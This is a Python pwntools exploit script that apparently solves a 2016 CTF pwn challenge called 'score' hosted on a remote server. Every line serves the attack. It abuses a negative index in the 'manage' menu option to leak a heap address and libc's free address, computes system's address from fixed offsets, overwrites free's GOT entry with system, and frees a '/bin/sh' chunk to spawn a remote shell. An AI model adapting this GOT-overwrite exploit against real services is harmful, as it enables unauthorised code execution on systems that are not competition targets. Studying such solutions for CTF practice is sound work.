#!/usr/bin/python

from pwn import *

DEBUG = True

#p = process("./score")


p = remote("kapo2016-pwn6363.cloudapp.net", 13000)

free_offset = 0x83a70
system_offset = 0x45380
#system_offset = 0x6f5d0

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def add(score, comment):
  r("select : ")
  p.sendline("1")

  r("Score : ")
  p.sendline(str(score))

  r("Comment : ")
  p.sendline(comment)

def delete(num):
  r("select : ")
  p.sendline("2")

  r("no : ")
  p.sendline(str(num))

def manage(num, score, comment):
  r("select : ")
  p.sendline("3")

  r("No : ")
  p.sendline(str(num))

  r("score : ")
  p.sendline(str(score))

  r("comment : ")
  p.sendline(comment)

def leak():
  r("select : ")
  p.sendline("4")

  r("Comment : ")
  leak = r("\n")

  return u64(leak[:-1].ljust(8,"\x00"))

r("ID : ")
p.sendline(p64(0x6020b8))

r("PW : ")
p.sendline("P@ssw0rd!")

add(1, "/bin/sh")
add(2, "/bin/sh")
add(3, "/bin/sh")
add(4, "/bin/sh")

delete(2)

manage(-2, 123, p64(0x6020c0)[:4])
heap_addr = leak()

manage(-2, 123, p64(0x602010)[:4])
free_addr = leak()

system_addr = free_addr - free_offset + system_offset

log.info ("Heap leak : %x" % heap_addr)
log.info ("Syetem addr : %x" % system_addr)

manage(0, 123, p64(system_addr)[:7])

manage(-2, 123, p64(heap_addr + 8)[:4])

delete(0)

p.interactive()

p.close()
